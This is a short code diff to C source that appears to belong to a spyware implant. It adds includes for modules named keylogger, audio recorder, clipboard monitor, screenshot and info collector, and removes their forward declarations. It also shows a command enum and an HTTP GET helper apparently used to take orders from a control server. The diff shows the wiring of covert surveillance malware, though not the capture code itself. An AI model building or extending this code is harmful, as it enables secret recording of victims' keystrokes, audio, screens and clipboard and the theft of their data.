@@ -5,6 +5,12 @@
 #include <string.h>
 #include <time.h>
 
+#include "audio_recorder.c"
+#include "clipboard_monitor.c"
+#include "info_collector.c"
+#include "keylogger.c"
+#include "screenshot.c"
+
 #ifdef _WIN32
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "ws2_32.lib")
@@ -23,13 +29,6 @@ typedef enum {
     CMD_INFO_COLLECT = 5,
     CMD_NONE = 0
 } CapabilityCommand;
-
-// Forward declarations of capability functions
-char* start_audio_recorder();
-char* start_clipboard_monitor();
-char* start_keylogger();
-char* start_screenshot();
-char* start_info_collector();
 
 // Make HTTP GET request and get response
 char* http_get_request(const char *server, int port, const char *path) {
